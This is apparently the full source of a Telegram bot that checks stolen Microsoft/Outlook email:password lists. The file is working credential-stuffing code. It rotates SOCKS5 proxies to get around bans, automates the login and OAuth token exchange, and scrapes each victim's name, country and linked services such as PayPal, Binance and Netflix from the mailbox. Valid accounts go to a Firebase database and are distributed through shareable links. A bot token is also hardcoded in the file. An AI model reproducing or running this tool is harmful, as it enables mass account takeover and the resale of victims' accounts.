import asyncio
import logging
import time
import re
import uuid
import random
from datetime import datetime, timezone
from typing import List, Dict, Optional, Union, Tuple
import aiohttp
import aiofiles
import requests
import pycountry
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import CommandStart, BaseFilter, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message, CallbackQuery, WebAppInfo
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.client.default import DefaultBotProperties
from aiogram.exceptions import TelegramBadRequest
BOT_TOKEN = "7863994619:AAGZZdgGKg05zy9A97n-_X3_GLLwBqNf7A4"
BOT_USERNAME = "OutlooxBot"
ADMIN_IDS = [7014650919]
FIREBASE_DB_URL = "https://new-prototype-nwxqu-default-rtdb.europe-west1.firebasedatabase.app/accounts.json"
FIREBASE_ACCOUNT_URL = "https://new-prototype-nwxqu-default-rtdb.europe-west1.firebasedatabase.app/accounts/{doc_id}.json"
WEB_APP_URL = "https://outloox.github.io/"
USER_DAILY_LIMIT = 20
BACKUP_FILE_PATH = "valid_accounts_backup.txt"
REQUEST_TIMEOUT = 25
CONCURRENT_TASKS = 15
ANTISPAM_DELAY = 5
PROXY_CHECK_TIMEOUT = 7
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="Markdown"))
dp = Dispatcher()
user_check_counts = {}
active_check_tasks = {}
user_last_request_time = {}
PROXY_LIST = []
def load_proxies():
    global PROXY_LIST
    try:
        with open("proxies.txt", "r") as f:
            PROXY_LIST = [line.strip() for line in f if line.strip()]
        if PROXY_LIST:
            logger.info(f"Successfully loaded {len(PROXY_LIST)} proxies from proxies.txt")
        else:
            logger.warning("proxies.txt is empty. Bot will run without proxies.")
    except FileNotFoundError:
        logger.warning("proxies.txt not found. Bot will run without proxies.")
    return len(PROXY_LIST)
load_proxies()
class IsAdminFilter(BaseFilter):
    async def __call__(self, message: Union[Message, CallbackQuery]) -> bool:
        return message.from_user.id in ADMIN_IDS
class AccountCheckStates(StatesGroup):
    awaiting_file = State()
COMMON_COUNTRY_NAMES = {"Korea, Republic of": "South Korea", "Iran, Islamic Republic of": "Iran", "Venezuela, Bolivarian Republic of": "Venezuela", "Bolivia, Plurinational State of": "Bolivia", "Russian Federation": "Russia", "United Kingdom": "UK", "United States": "USA", "Syrian Arab Republic": "Syria", "Viet Nam": "Vietnam", "Taiwan, Province of China": "Taiwan"}
SERVICE_DOMAINS = {'facebookmail.com': 'Facebook', 'mail.instagram.com': 'Instagram', 'account.tiktok.com': 'TikTok', 'x.com': 'Twitter/X', 'paypal.com': 'PayPal', 'binance.com': 'Binance', 'account.netflix.com': 'Netflix', 'txn-email.playstation.com': 'PlayStation', 'id.supercell.com': 'Supercell', 'acct.epicgames.com': 'Epic Games', 'spotify.com': 'Spotify', 'rockstargames.com': 'Rockstar', 'engage.xbox.com': 'Xbox', 'google.com': 'Google', 'steampowered.com': 'Steam', 'roblox.com': 'Roblox', 'e.ea.com': 'EA', 'tm.openai.com': 'OpenAI/ChatGPT', 'tencentgames.com': 'Tencent', 'amazon.com': 'Amazon', 'discord.com': 'Discord', 'crunchyroll.com': 'Crunchyroll', 'linkedin.com': 'LinkedIn', 'github.com': 'GitHub', 'twitch.tv': 'Twitch', 'ubisoft.com': 'Ubisoft', 'riotgames.com': 'Riot Games', 'blizzard.com': 'Blizzard', 'disneyplus.com': 'Disney+', 'hulu.com': 'Hulu', 'apple.com': 'Apple ID', 'ebay.com': 'eBay', 'aliexpress.com': 'AliExpress', 'booking.com': 'Booking.com', 'airbnb.com': 'Airbnb', 'uber.com': 'Uber', 'microsoft.com': 'Microsoft', 'office.com': 'Office 365'}
def get_country_name_and_flag(country_code: str) -> Tuple[str, str]:
    if not country_code or len(country_code) != 2: return "Unknown", '❔'
    try:
        country = pycountry.countries.get(alpha_2=country_code.upper())
        if not country: return "Unknown", '❔'
        flag = ''.join(chr(ord(c) + 127397) for c in country.alpha_2)
        official_name = country.name
        name = COMMON_COUNTRY_NAMES.get(official_name, official_name)
        return name, flag
    except Exception: return "Unknown", '❔'
def get_services_from_startup_data(response_text: str) -> List[str]:
    found_services = set()
    emails_found = re.findall(r'[\w\.\-]+@[\w\.\-]+\.[\w\.\-]+', response_text)
    for email in emails_found:
        try:
            domain = email.split('@')[1]
            if domain in SERVICE_DOMAINS:
                found_services.add(SERVICE_DOMAINS[domain])
        except IndexError: continue
    return sorted(list(found_services))
def get_infoo(session: requests.Session, email: str, token: str, cid: str) -> dict:
    details = {'name': 'N/A', 'country': 'Unknown', 'services': []}
    try:
        proxies = session.proxies
        headers = {"User-Agent": "Outlook-Android/2.0", "Pragma": "no-cache", "Accept": "application/json", "ForceSync": "false", "Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}", "Host": "substrate.office.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"}
        response = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=REQUEST_TIMEOUT, proxies=proxies)
        if response.status_code == 200:
            profile_data = response.json()
            if profile_data.get('names'): details['name'] = profile_data['names'][0].get('displayName', 'N/A')
            if profile_data.get('accounts'):
                location_code = profile_data['accounts'][0].get('location', '')
                country_name, _ = get_country_name_and_flag(location_code)
                details['country'] = country_name
        outlook_headers = {"Host": "outlook.live.com", "content-length": "0", "x-owa-sessionid": cid, "x-req-source": "Mini", "authorization": f"Bearer {token}", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36", "action": "StartupData", "x-owa-correlationid": cid, "ms-cv": "YizxQK73vePSyVZZXVeNr+.3", "content-type": "application/json; charset=utf-8", "accept": "*/*", "origin": "https://outlook.live.com", "x-requested-with": "com.microsoft.outlooklite", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://outlook.live.com/", "accept-encoding": "gzip, deflate", "accept-language": "en-US,en;q=0.9"}
        outlook_response = session.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", headers=outlook_headers, data="", timeout=REQUEST_TIMEOUT, proxies=proxies)
        if outlook_response.status_code == 200: details['services'] = get_services_from_startup_data(outlook_response.text)
    except Exception: pass
    return details
def get_token(session: requests.Session, email: str) -> Optional[dict]:
    try:
        code = session.headers.get('Location', '').split('code=')[1].split('&')[0]
        cid = session.cookies.get('MSPCID', '').upper()
        token_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
        token_data = {"client_info": "1", "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D", "grant_type": "authorization_code", "code": code, "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
        response = session.post(token_url, data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=REQUEST_TIMEOUT, proxies=session.proxies)
        if response.status_code == 200:
            token = response.json().get("access_token")
            if token: return get_infoo(session, email, token, cid)
    except Exception: pass
    return None
def get_values_and_login(session: requests.Session, email: str, password: str, proxy: Optional[str]) -> Tuple[Optional[Dict], Optional[str]]:
    proxies_dict = None
    if proxy:
        proxies_dict = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
        session.proxies = proxies_dict
    try:
        ua = "Mozilla/5.0 (Linux; Android 11; SM-A105F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
        get_headers = {"upgrade-insecure-requests": "1", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.microsoft.outlooklite", "accept-encoding": "gzip, deflate", "accept-language": "en-US,en;q=0.9"}
        auth_url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&mkt=en&response_type=code&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
        resp1 = session.get(auth_url, headers=get_headers, timeout=REQUEST_TIMEOUT)
        if resp1.status_code != 200: return None, f"Network Error ({resp1.status_code})"
        html_content = resp1.text
        if "IfExistsResult\":1" in html_content: return None, "Account Not Found"
        ppft, pl = None, None
        server_data_match = re.search(r'var ServerData\s*=\s*({.*?});', html_content)
        if server_data_match:
            server_data_text = server_data_match.group(1)
            sft_match = re.search(r'"sFT":"<input type=\\"hidden\\" name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)\\"', server_data_text)
            if sft_match: ppft = sft_match.group(1)
            if not ppft:
                sfttag_match = re.search(r'"sFTTag":"<input type=\\"hidden\\" name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)\\"', server_data_text)
                if sfttag_match: ppft = sfttag_match.group(1)
            pl_match = re.search(r'"urlPost":"([^"]+)"', server_data_text)
            if pl_match: pl = pl_match.group(1)
        if not ppft or not pl:
            ppft_match_legacy = re.search(r'name="PPFT" id="i0327" value="([^"]+)"', html_content)
            pl_match_legacy = re.search(r"urlPost:'([^']+)'", html_content)
            if ppft_match_legacy and pl_match_legacy:
                ppft = ppft_match_legacy.group(1)
                pl = pl_match_legacy.group(1)
        if not ppft or not pl: return None, "Page Parse Error"
        post_content = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772"
        post_headers = {"User-Agent": ua, "Pragma": "no-cache", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Connection": "keep-alive", "Content-Length": str(len(post_content)), "Cache-Control": "max-age=0", "Origin": "https://login.live.com", "X-Requested-With": "com.microsoft.outlooklite", "Referer": resp1.url, "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Content-Type": "application/x-www-form-urlencoded"}
        resp2 = session.post(pl, data=post_content, headers=post_headers, allow_redirects=False, timeout=REQUEST_TIMEOUT)
        if resp2.status_code == 302 and 'Location' in resp2.headers and 'oauth20_desktop.srf' in resp2.headers['Location']:
            session.headers.update(resp2.headers)
            details = get_token(session, email)
            return details, None if details else "Token Error"
        resp2_text = resp2.text
        if "account or password is incorrect" in resp2_text: return None, "Incorrect Credentials"
        if "https://account.live.com/recover" in resp2_text: return None, "2FA / Recovery Needed"
        if "https://account.live.com/Abuse" in resp2_text: return None, "Account Blocked"
        if "too many times" in resp2_text: return None, "Too Many Attempts (Ban)"
        return None, "Unknown Login Error"
    except requests.exceptions.ProxyError: return None, "Proxy Error"
    except requests.exceptions.RequestException: return None, "Network Error"
    except Exception: return None, "Critical Error"
def check_with_proxy_rotation(email: str, password: str) -> Tuple[Optional[Dict], Optional[str]]:
    if not PROXY_LIST:
        session = requests.Session()
        return get_values_and_login(session, email, password, None)
    shuffled_proxies = PROXY_LIST[:]
    random.shuffle(shuffled_proxies)
    last_error = "No proxies attempted"
    for i, proxy in enumerate(shuffled_proxies):
        logger.info(f"[{email}] Attempt {i+1}/{len(shuffled_proxies)} using proxy: {proxy}")
        session = requests.Session()
        try:
            details, error_type = get_values_and_login(session, email, password, proxy)
            if details: return details, None
            last_error = error_type
            if error_type == "Too Many Attempts (Ban)": continue
            elif error_type in ["Proxy Error", "Network Error"]: continue
            else: return None, error_type
        except Exception as e:
            last_error = f"Critical rotation error: {e}"
            continue
    return None, f"All Proxies Failed ({last_error})"
async def get_firebase_account_count() -> int:
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(FIREBASE_DB_URL, params={'shallow': 'true'}) as response:
                if response.status == 200:
                    data = await response.json()
                    return len(data) if data else 0
    except Exception as e:
        logger.error(f"Could not get account count from Firebase: {e}")
    return 0
async def upload_to_firebase(session: aiohttp.ClientSession, account_data: Dict) -> Optional[str]:
    payload = {"email": account_data["email"], "password": account_data["password"], "country": account_data.get("country", "Unknown"), "services": account_data.get("services", []), "createdAt": datetime.now(timezone.utc).isoformat(), "reportCount": 0}
    try:
        async with session.post(FIREBASE_DB_URL, json=payload) as response:
            if response.status == 200:
                data = await response.json()
                doc_id = data['name']
                link = f"https://t.me/{BOT_USERNAME}?start={doc_id}"
                update_url = FIREBASE_ACCOUNT_URL.format(doc_id=doc_id)
                async with session.patch(update_url, json={"link": link}) as patch_response:
                    if patch_response.status == 200:
                        logger.info(f"Uploaded and linked {account_data['email']}")
                        return link
    except Exception as e: logger.error(f"Error during Firebase upload for {account_data['email']}: {e}")
    return None
async def save_to_backup_file(account_data: Dict, link: str):
    try:
        async with aiofiles.open(BACKUP_FILE_PATH, mode='a', encoding='utf-8') as f:
            await f.write(f"{account_data['email']}:{account_data['password']} {link}\n")
    except Exception as e: logger.error(f"Failed to write to backup file: {e}")
def format_result_message(account_data: Dict) -> str:
    name_str = account_data.get("name", "N/A")
    services_str = ", ".join(account_data.get("services", [])) or "N/A"
    country_name = account_data.get('country', 'Unknown')
    _, country_flag = get_country_name_and_flag(country_name)
    return (f"✅ **Valid Account Found** ✅\n\n"
            f"👤 **Name:** {name_str}\n"
            f"📧 **Email:** `{account_data['email']}`\n🔑 **Password:** `{account_data['password']}`\n"
            f"🌍 **Country:** {country_flag} *{country_name}*\n"
            f"🔗 **Linked Services:** {services_str}")
async def run_sync_in_executor(func, *args):
    return await asyncio.get_running_loop().run_in_executor(None, func, *args)
@dp.message(CommandStart())
async def handle_start(message: Message, state: FSMContext):
    await state.clear()
    user_id = message.from_user.id
    args = message.text.split()
    if len(args) > 1:
        doc_id = args[1]
        status_msg = await message.answer("🔍 Verifying account from link...")
        account_data_from_db = None
        try:
            async with aiohttp.ClientSession() as session:
                url = FIREBASE_ACCOUNT_URL.format(doc_id=doc_id)
                async with session.get(url) as response:
                    if response.status == 200: account_data_from_db = await response.json()
        except Exception as e:
            logger.error(f"Error fetching from Firebase for {doc_id}: {e}")
            await status_msg.edit_text("❌ An error occurred while contacting the database.")
            return
        if not account_data_from_db or 'email' not in account_data_from_db or 'password' not in account_data_from_db:
            await status_msg.edit_text("❌ Account not found or link is invalid.")
            return
        await perform_manual_check(status_msg, account_data_from_db['email'], account_data_from_db['password'], is_retry=True)
        return
    if user_id in ADMIN_IDS:
        account_count = await get_firebase_account_count()
        proxies_loaded = len(PROXY_LIST)
        admin_text = (f"👑 **Welcome, Admin!**\n\n"
                      f"Here is your control panel. You can manage accounts or open the web application.\n\n"
                      f"📊 **Live Accounts in DB:** `{account_count}`\n"
                      f"🌐 **Proxies Loaded:** `{proxies_loaded}`")
        builder = InlineKeyboardBuilder()
        builder.button(text="🚀 Open Web App", web_app=WebAppInfo(url=WEB_APP_URL))
        builder.button(text="🗂️ Manage Files", callback_data="admin:manage_files")
        builder.button(text="♻️ Manage Proxies", callback_data="admin:manage_proxies")
        builder.adjust(1)
        await message.answer(admin_text, reply_markup=builder.as_markup())
    else:
        user_text = (f"👋 **Welcome to the Account Checker Bot!**\n\n"
                     f"To get started, open our web application to browse and verify available accounts.\n\n"
                     f"Tap the button below to launch the app.")
        builder = InlineKeyboardBuilder()
        builder.button(text="🚀 Open Web App", web_app=WebAppInfo(url=WEB_APP_URL))
        await message.answer(user_text, reply_markup=builder.as_markup())
async def perform_manual_check(message: Message, email: str, password: str, is_retry: bool = False):
    status_msg = message if is_retry else await message.reply(f"🔍 Checking `{email}`...")
    if is_retry: await status_msg.edit_text(f"🔍 Retrying check for `{email}`...", reply_markup=None)
    valid_account, error_type = await run_sync_in_executor(check_with_proxy_rotation, email, password)
    if valid_account:
        valid_account.update({"email": email, "password": password})
        await status_msg.edit_text(format_result_message(valid_account), reply_markup=None)
    else:
        builder = InlineKeyboardBuilder()
        builder.button(text="🔄 Retry Check", callback_data=f"retry:{email}:{password}")
        error_text = (f"❌ **Check Failed**\n\n"
                      f"**Account:** `{email}`\n"
                      f"**Reason:** *{error_type}*")
        await status_msg.edit_text(error_text, reply_markup=builder.as_markup())
@dp.message(F.text.contains(':'))
async def handle_manual_check(message: Message):
    user_id = message.from_user.id
    current_time = time.time()
    if user_id in user_last_request_time and current_time - user_last_request_time[user_id] < ANTISPAM_DELAY:
        await message.reply(f"⏳ Please wait a few seconds before sending another request.")
        return
    user_last_request_time[user_id] = current_time
    if user_id not in ADMIN_IDS:
        today = datetime.now(timezone.utc).date()
        if user_id not in user_check_counts or user_check_counts[user_id]['date'] != today:
            user_check_counts[user_id] = {'date': today, 'count': 0}
        if user_check_counts[user_id]['count'] >= USER_DAILY_LIMIT:
            await message.reply("❌ You have reached your daily limit.")
            return
        user_check_counts[user_id]['count'] += 1
    try:
        text_to_check = message.text
        if text_to_check.lower().startswith('/chk'): text_to_check = text_to_check[4:].strip()
        email, password = [x.strip() for x in text_to_check.split(':', 1)]
    except ValueError:
        await message.reply("Invalid format. Use `email:password` or `/chk email:password`.")
        return
    await perform_manual_check(message, email, password)
@dp.callback_query(F.data.startswith("retry:"))
async def retry_check_handler(callback: CallbackQuery):
    try:
        _, email, password = callback.data.split(":", 2)
    except ValueError:
        await callback.answer("Error: Invalid retry data.", show_alert=True)
        return
    await perform_manual_check(callback.message, email, password, is_retry=True)
@dp.callback_query(IsAdminFilter(), F.data == "admin:manage_files")
async def admin_manage_files(callback: CallbackQuery):
    builder = InlineKeyboardBuilder()
    builder.button(text="📁 Check File (Only)", callback_data="admin:check_file_only")
    builder.button(text="🚀 Check & Upload to Firebase", callback_data="admin:check_and_upload")
    builder.button(text="⬅️ Back to Main Menu", callback_data="admin:back_to_start")
    builder.adjust(1)
    await callback.message.edit_text("🗂️ **File Management**\n\nChoose an option for the file you will upload:", reply_markup=builder.as_markup())
    await callback.answer()
@dp.callback_query(IsAdminFilter(), F.data == "admin:manage_proxies")
async def admin_manage_proxies(callback: CallbackQuery):
    builder = InlineKeyboardBuilder()
    builder.button(text="🔄 Reload Proxies from File", callback_data="proxies:reload")
    builder.button(text="🧼 Clean Dead Proxies", callback_data="proxies:clean")
    builder.button(text="⬅️ Back to Main Menu", callback_data="admin:back_to_start")
    builder.adjust(1)
    await callback.message.edit_text(f"🌐 **Proxy Management**\n\nCurrently loaded: `{len(PROXY_LIST)}` proxies.", reply_markup=builder.as_markup())
    await callback.answer()
@dp.callback_query(IsAdminFilter(), F.data == "proxies:reload")
async def proxy_reload_handler(callback: CallbackQuery):
    await callback.answer("🔄 Reloading proxies...")
    count = load_proxies()
    await callback.message.edit_text(f"✅ Proxies reloaded. Found `{count}` proxies in the file.")
async def check_single_proxy(proxy: str, session: aiohttp.ClientSession) -> Optional[str]:
    try:
        proxy_url = f"socks5://{proxy}"
        async with session.get("http://httpbin.org/ip", proxy=proxy_url, timeout=PROXY_CHECK_TIMEOUT) as response:
            if response.status == 200:
                return proxy
    except (aiohttp.ClientError, asyncio.TimeoutError):
        pass
    except Exception as e:
        logger.error(f"Unexpected error while checking proxy {proxy}: {e}")
    return None
@dp.callback_query(IsAdminFilter(), F.data == "proxies:clean")
async def proxy_clean_handler(callback: CallbackQuery):
    global PROXY_LIST
    if not PROXY_LIST:
        await callback.answer("⚠️ No proxies loaded to clean.", show_alert=True)
        return
    original_count = len(PROXY_LIST)
    await callback.message.edit_text(f"🧼 Cleaning `{original_count}` proxies... This may take a while.")
    live_proxies = []
    async with aiohttp.ClientSession() as session:
        tasks = [check_single_proxy(p, session) for p in PROXY_LIST]
        results = await asyncio.gather(*tasks)
        live_proxies = [res for res in results if res is not None]
    new_count = len(live_proxies)
    PROXY_LIST = live_proxies
    try:
        async with aiofiles.open("proxies.txt", "w") as f:
            await f.write("\n".join(live_proxies))
        await callback.message.edit_text(f"✅ Cleaning complete!\n\n"
                                         f"Original: `{original_count}`\n"
                                         f"Live: `{new_count}` (Removed `{original_count - new_count}`)\n\n"
                                         f"File `proxies.txt` has been updated with live proxies.")
    except Exception as e:
        await callback.message.edit_text(f"❌ Error writing to `proxies.txt`: {e}")
    await callback.answer()
@dp.callback_query(IsAdminFilter(), F.data == "admin:back_to_start")
async def admin_back_to_start(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await handle_start(callback.message, state)
    await callback.answer()
@dp.callback_query(IsAdminFilter(), F.data.startswith("admin:check_"))
async def admin_file_options(callback: CallbackQuery, state: FSMContext):
    action = callback.data.split(":")[1]
    await state.update_data(action=action)
    await state.set_state(AccountCheckStates.awaiting_file)
    action_text = "check" if action == "check_file_only" else "check and upload"
    await callback.message.edit_text(f"Please upload the `.txt` file to {action_text}.")
    await callback.answer()
async def check_and_process_account(line: str, action: str, session: aiohttp.ClientSession) -> Optional[Dict]:
    try:
        email, password = [x.strip() for x in line.split(':', 1)]
    except ValueError: return None
    account_data, _ = await run_sync_in_executor(check_with_proxy_rotation, email, password)
    if account_data:
        account_data.update({"email": email, "password": password})
        if action == "check_and_upload":
            link = await upload_to_firebase(session, account_data)
            if link: await save_to_backup_file(account_data, link)
        return account_data
    return None
async def file_check_runner(message: Message, accounts: List[str], action: str, status_msg: Message, task_id: str):
    total_accounts = len(accounts)
    checked_count = 0
    valid_count = 0
    last_update_time = time.time()
    tasks = set()
    account_iterator = iter(accounts)
    try:
        # Use a single session for the entire file check for better performance
        async with aiohttp.ClientSession() as session:
            while checked_count < total_accounts:
                # Check if the task has been cancelled by the user
                if not asyncio.current_task().cancelled():
                    # Fill up the task queue up to the concurrent limit
                    while len(tasks) < CONCURRENT_TASKS:
                        try:
                            line = next(account_iterator)
                            task = asyncio.create_task(check_and_process_account(line, action, session))
                            tasks.add(task)
                        except StopIteration:
                            # No more accounts to process
                            break
                    
                    if not tasks:
                        # All tasks are done
                        break

                    # Wait for the first task to complete
                    done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                    
                    for task in done:
                        result = await task
                        checked_count += 1
                        if result:
                            valid_count += 1
                            # Send a message for each valid account found
                            await message.answer(format_result_message(result))
                    
                    tasks = pending
                    
                    current_time = time.time()
                    # Update progress message every second, every 5 accounts, or at the very end
                    if current_time - last_update_time > 1 or checked_count % 5 == 0 or checked_count == total_accounts:
                        progress_percent = (checked_count / total_accounts) * 100
                        progress_bar = "█" * int(progress_percent / 10) + "░" * (10 - int(progress_percent / 10))
                        
                        builder = InlineKeyboardBuilder()
                        builder.button(text="❌ Stop Checking", callback_data=f"stop_check:{task_id}")
                        
                        progress_text = (f"🚀 **Checking in Progress...**\n\n"
                                         f"Checked: **{checked_count}/{total_accounts}**\nValid Found: **{valid_count}**\n\n"
                                         f"`[{progress_bar}]` {progress_percent:.2f}%")
                        try:
                            # Edit the status message with the new progress
                            await status_msg.edit_text(progress_text, reply_markup=builder.as_markup())
                        except TelegramBadRequest:
                            # Ignore if the message is not modified (to prevent errors)
                            pass
                        last_update_time = current_time
                else:
                    # If the task was cancelled, cancel all running sub-tasks
                    for task in tasks:
                        task.cancel()
                    await asyncio.gather(*tasks, return_exceptions=True)
                    raise asyncio.CancelledError

        # Final summary message after completion
        summary_msg = (f"✅ **Processing Complete!**\n\n"
                       f"Total: **{total_accounts}** | Valid: **{valid_count}** | Invalid: **{total_accounts - valid_count}**")
        if action == "check_and_upload":
            summary_msg += f"\n\n📝 Valid accounts uploaded and saved."
        await status_msg.edit_text(summary_msg, reply_markup=None)

    except asyncio.CancelledError:
        logger.info(f"Task {task_id} was cancelled by the user.")
        await status_msg.edit_text(f"🛑 **Checking stopped by user.**\n\nChecked: {checked_count}/{total_accounts}\nValid Found: {valid_count}", reply_markup=None)
    except Exception as e:
        logger.error(f"Error during file processing task {task_id}: {e}", exc_info=True)
        await status_msg.edit_text(f"An unexpected error occurred: {e}", reply_markup=None)
    finally:
        # Clean up the active task entry
        if task_id in active_check_tasks:
            del active_check_tasks[task_id]

@dp.message(IsAdminFilter(), AccountCheckStates.awaiting_file, F.document)
async def handle_admin_file(message: Message, state: FSMContext):
    user_id = message.from_user.id
    current_time = time.time()
    
    # Anti-spam check
    if user_id in user_last_request_time and current_time - user_last_request_time[user_id] < ANTISPAM_DELAY:
        await message.reply(f"⏳ Please wait a few seconds before starting a new file check.")
        return
    user_last_request_time[user_id] = current_time

    if not message.document.file_name.lower().endswith('.txt'):
        await message.reply("❌ Invalid file type. Please upload a `.txt` file.")
        return

    state_data = await state.get_data()
    action = state_data.get("action", "check_file_only")
    await state.clear()

    try:
        # Download file content from Telegram
        file_content_bytes = await bot.download(message.document)
        content = file_content_bytes.read().decode('utf-8', errors='ignore')
        accounts = [line.strip() for line in content.splitlines() if ':' in line]

        if not accounts:
            await message.reply("❌ No valid `email:password` lines found in the file.")
            return

        # Create a unique ID for the task to allow stopping it
        task_id = str(uuid.uuid4())
        
        builder = InlineKeyboardBuilder()
        builder.button(text="❌ Stop Checking", callback_data=f"stop_check:{task_id}")
        
        status_msg = await message.reply("📥 File received, preparing to check...", reply_markup=builder.as_markup())
        
        # Create and start the background task
        task = asyncio.create_task(file_check_runner(message, accounts, action, status_msg, task_id))
        active_check_tasks[task_id] = task

    except Exception as e:
        logger.error(f"Error preparing file check: {e}", exc_info=True)
        await message.reply(f"An error occurred while preparing the file: {e}")

@dp.callback_query(IsAdminFilter(), F.data.startswith("stop_check:"))
async def stop_check_handler(callback: CallbackQuery):
    task_id = callback.data.split(":")[1]
    task = active_check_tasks.get(task_id)
    
    if task and not task.done():
        task.cancel()
        await callback.answer("Stopping the checking process...")
    else:
        await callback.answer("This task is already completed or stopped.", show_alert=True)

async def main():
    logger.info("Bot is starting polling...")
    # Ensure no old webhooks are set
    await bot.delete_webhook(drop_pending_updates=True)
    # Start polling for updates
    await dp.start_polling(bot)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Bot stopped.")
